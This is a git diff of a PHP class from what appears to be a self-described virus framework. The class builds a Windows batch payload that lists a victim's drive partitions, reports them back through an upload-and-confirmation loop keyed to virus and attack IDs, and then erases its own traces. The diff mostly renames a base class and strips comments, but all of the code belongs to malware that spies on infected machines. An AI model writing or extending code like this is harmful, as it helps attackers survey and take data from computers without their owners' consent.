@@ -1,11 +1,11 @@
-<?php /** @noinspection PhpUnused */
+<?php
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
-class ScanPartitions extends AttackInterface {
+class ScanPartitions extends AttackBase {
     private string $availableDrives = "";
 
     public function setAvailableDrives(string $availableDrives): void {
@@ -16,21 +16,11 @@ class ScanPartitions extends AttackInterface {
         return str_split($this->availableDrives);
     }
 
-    /**
-     * This will restore the state of an attack with all of its configuration using a json string.
-     *
-     * @param string $json The JSON string
-     */
     protected function setState(string $json): void {
         $state = json_decode($json, true);
         $this->availableDrives = $state["available_drives"];
     }
 
-    /**
-     * This will get the state of an attack as a json string
-     *
-     * @return string The JSON string
-     */
     protected function getState(): string {
         $state = [];
         $state["available_drives"] = $this->availableDrives;
@@ -43,9 +33,8 @@ class ScanPartitions extends AttackInterface {
         <?php return ob_get_clean();
     }
 
-    //@formatter:off
     public function generateBatchCode(): string {
-        ob_start(); ?>
+        ob_start(); //@formatter:off ?>
         @echo off
         SetLocal EnableDelayedExpansion
         chCp 65001
@@ -57,13 +46,9 @@ class ScanPartitions extends AttackInterface {
         <?php
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean();
+        return ob_get_clean(); //@formatter:on
     }
-    //@formatter:on
 
-    /**
-     * @inheritDoc
-     */
-    public function processExtras(string $resource): void {
+    public function processExtras(string $resourceIdentifier): void {
     }
 }
